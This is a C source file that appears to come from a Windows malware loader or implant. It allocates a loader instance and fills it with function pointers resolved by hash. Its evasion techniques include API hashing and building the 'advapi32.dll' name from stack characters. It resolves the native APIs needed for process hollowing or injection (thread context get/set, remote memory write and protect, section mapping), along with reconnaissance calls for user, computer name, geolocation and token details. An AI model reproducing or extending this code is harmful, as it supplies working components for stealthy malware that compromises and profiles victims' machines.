#include "../../includes/core/core.h"
#include "../../includes/api/apis.h"


BOOL LdrAllocateCoreStructsAndLoadApis() {
	HMODULE ntdll = GetModule(HASHED_ntdll);
	HMODULE kernel32 = GetModule(HASHED_kernel32);


	pLocalAlloc fnLocalAlloc = (pLocalAlloc)GetProc(kernel32, HASHED_LocalAlloc);
	if(!fnLocalAlloc)
		return FALSE;

	ldr = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(LdrInstance));
	if(!ldr)
		return FALSE;
	ldr->win32 = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Win32));
	ldr->modules = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Modules));
	ldr->config = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Config));
	if(!ldr->win32 || !ldr->modules || !ldr->config)
		return FALSE;
	ldr->win32->LocalAlloc = fnLocalAlloc;

	ldr->modules->ntdll    = ntdll;
	ldr->modules->kernel32 = kernel32;





	ldr->win32->GetProcAddress = (pGetProcAddress)GetProc(kernel32, HASHED_GetProcAddress);
	ldr->win32->LoadLibraryA = (pLoadLibraryA)GetProc(kernel32, HASHED_LoadLibraryA);
	ldr->win32->LocalFree = (pLocalFree)GetProc(kernel32, HASHED_LocalFree);
	ldr->win32->LocalReAlloc = (pLocalReAlloc)GetProc(kernel32, HASHED_LocalReAlloc);
	ldr->win32->RtlExitUserThread = (pRtlExitUserThread)GetProc(ntdll, HASHED_RtlExitUserThread);
	ldr->win32->CreateProcessA = (pCreateProcessA)GetProc(kernel32, HASHED_CreateProcessA);
	ldr->win32->NtResumeThread  = (pNtResumeThread)GetProc(ntdll, HASHED_NtResumeThread);
	ldr->win32->NtGetContextThread = (pNtGetContextThread)GetProc(ntdll, HASHED_NtGetContextThread);
	ldr->win32->NtSetContextThread = (pNtSetContextThread)GetProc(ntdll, HASHED_NtSetContextThread);
	ldr->win32->NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProc(ntdll, NTALLOCATEVIRTUALMEMORY_HASH);
	ldr->win32->NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProc(ntdll, NTPROTECTVIRTUALMEMORY_HASH);
	ldr->win32->NtFlushInstructionCache = (pNtFlushInstructionCache)GetProc(ntdll, NTFLUSHINSTRUCTIONCACHE_HASH);
	ldr->win32->NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProc(ntdll, HASHED_NtFreeVirtualMemory);
	ldr->win32->NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProc(ntdll, HASHED_NtWriteVirtualMemory);
	ldr->win32->CloseHandle = (pCloseHandle)GetProc(kernel32, HASHED_CloseHandle);
	ldr->win32->NtDelayExecution = (pNtDelayExecution)GetProc(ntdll, HASHED_NtDelayExecution);
	ldr->win32->CreateThread = (pCreateThread)GetProc(kernel32, HASHED_CreateThread);
	ldr->win32->RegisterWaitForSingleObject = (pRegisterWaitForSingleObject)GetProc(kernel32, HASHED_RegisterWaitForSingleObject);
	ldr->win32->FreeLibrary = (pFreeLibrary)GetProc(kernel32, HASHED_FreeLibrary);
	ldr->win32->CreateFileA = (pCreateFileA)GetProc(kernel32, HASHED_CreateFileA);
	ldr->win32->NtCreateSection = (pNtCreateSection)GetProc(ntdll, HASHED_NtCreateSection);
	ldr->win32->NtMapViewOfSection = (pNtMapViewOfSection)GetProc(ntdll, HASHED_NtMapViewOfSection);
	ldr->win32->GetComputerNameExA = (pGetComputerNameExA)GetProc(kernel32, HASHED_GetComputerNameExA);
	CHAR advapi[13];
	advapi[0]  = 'a'; advapi[1]  = 'd'; advapi[2]  = 'v';
	advapi[3]  = 'a'; advapi[4]  = 'p'; advapi[5]  = 'i';
	advapi[6]  = '3'; advapi[7]  = '2'; advapi[8]  = '.';
	advapi[9]  = 'd'; advapi[10] = 'l'; advapi[11] = 'l';
	advapi[12] = '\0';
	HMODULE advapi32 = ldr->win32->LoadLibraryA(advapi);
	ldr->win32->GetUserNameA   = (pGetUserNameA)GetProc(advapi32, HASHED_GetUserNameA);
	ldr->win32->GetModuleFileNameA = (pGetModuleFileNameA)GetProc(kernel32, HASHED_GetModuleFileNameA);
	ldr->win32->GetUserGeoId = (pGetUserGeoId)GetProc(kernel32, HASHED_GetUserGeoID);
	ldr->win32->GetGeoInfoA  = (pGetGeoInfoA)GetProc(kernel32, HASHED_GetGeoInfoA);
	ldr->win32->NtOpenProcessToken = (pNtOpenProcessToken)GetProc(ntdll, HASHED_NtOpenProcessToken);
	ldr->win32->NtQueryInformationToken = (pNtQueryInformationToken)GetProc(ntdll, HASHED_NtQueryInformationToken);



	return TRUE;
}